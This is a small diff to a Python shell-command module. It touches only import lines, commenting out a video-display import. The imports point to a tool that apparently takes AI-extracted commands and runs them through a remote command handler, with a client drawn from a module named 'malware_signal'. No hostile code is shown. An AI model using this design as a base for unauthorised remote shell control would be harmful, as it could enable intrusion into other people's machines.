@@ -1,6 +1,5 @@
 #command/bash/shell.py
 import asyncio
-#import cv2
 import os
 from app.tools.tool_utilities.ai_utils import _fallback_command, _extract_command_text
 from app.tools.tool_utilities.command_validator import CommandValidator
@@ -11,7 +10,7 @@ from app.malware_signal.signal import SignalClient
 from app.core.data.config import HOST, ROOM
 from app.core.data.client import client_id, username
 from app.tools.tool_utilities.remote_command_handler import RemoteCommandHandler as SenderHandler
-from app.tools.tool_utilities.media import show_video
+#from app.tools.tool_utilities.media import show_video
 
 
 def _load_system_prompt() -> str:
